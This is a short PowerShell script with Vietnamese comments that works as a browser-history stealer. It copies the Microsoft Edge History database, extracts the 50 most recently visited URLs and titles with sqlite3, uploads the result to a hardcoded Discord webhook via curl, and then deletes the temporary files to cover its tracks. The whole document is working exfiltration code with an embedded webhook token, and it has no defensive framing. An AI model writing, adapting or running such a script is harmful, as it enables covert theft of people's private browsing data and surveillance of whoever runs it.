param(
    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe"
)

# Webhook Discord của bạn
$dc = "1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
$whuri = "$dc"
if ($whuri.Length -lt 120){
    $whuri = ("https://discord.com/api/webhooks/" + "$dc")
}

# Đường dẫn file tạm để lưu kết quả
$outpath = "$env:TEMP\edge_history.txt"

# Đường dẫn file History của Edge
$edgeHistory = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
$copyPath = "$env:TEMP\HistoryCopy"

if ((Test-Path $edgeHistory) -and (Test-Path $sqlitePath)) {
    # Copy file History sang Temp để tránh bị khóa
    Copy-Item $edgeHistory $copyPath -Force

    # Query bằng sqlite3.exe trên bản sao
    & $sqlitePath $copyPath "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50;" | Out-File -FilePath $outpath -Encoding UTF8

    # Xóa bản sao sau khi dùng
    Remove-Item $copyPath -Force
} else {
    "Không tìm thấy file lịch sử Edge hoặc sqlite3.exe." | Out-File -FilePath $outpath -Encoding UTF8
}

# Gửi file lên Discord
curl.exe -F file1=@"$outpath" $whuri | Out-Null
Start-Sleep -Seconds 2
Remove-Item -Path $outpath -Force
